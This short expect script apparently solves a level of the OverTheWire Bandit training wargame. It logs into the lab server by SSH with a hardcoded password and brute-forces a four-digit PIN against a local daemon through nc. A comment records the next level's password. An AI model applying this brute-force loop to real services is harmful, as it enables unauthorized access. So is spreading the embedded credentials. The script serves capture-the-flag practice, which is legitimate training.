#!/usr/bin/expect -f

spawn ssh -p 2220 bandit24@bandit.labs.overthewire.org
expect "*: "
send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
expect "*\$ "

send "nc localhost 30002\r"

# the connection gets reset sometimes. so jump to last reset (6900 for me)
set startLoop 6900
set endLoop 10000
# note it succeeded at 8530 with uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
# this took several hours - a bit of psychology would have suggested maybe count back

for {set i $startLoop} {$i < $endLoop} {incr i 1} {
    set pin "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [format "%04d" $i]\r"
    send "$pin"
    expect "Wrong! Please enter the correct pincode. Try again."
}

interact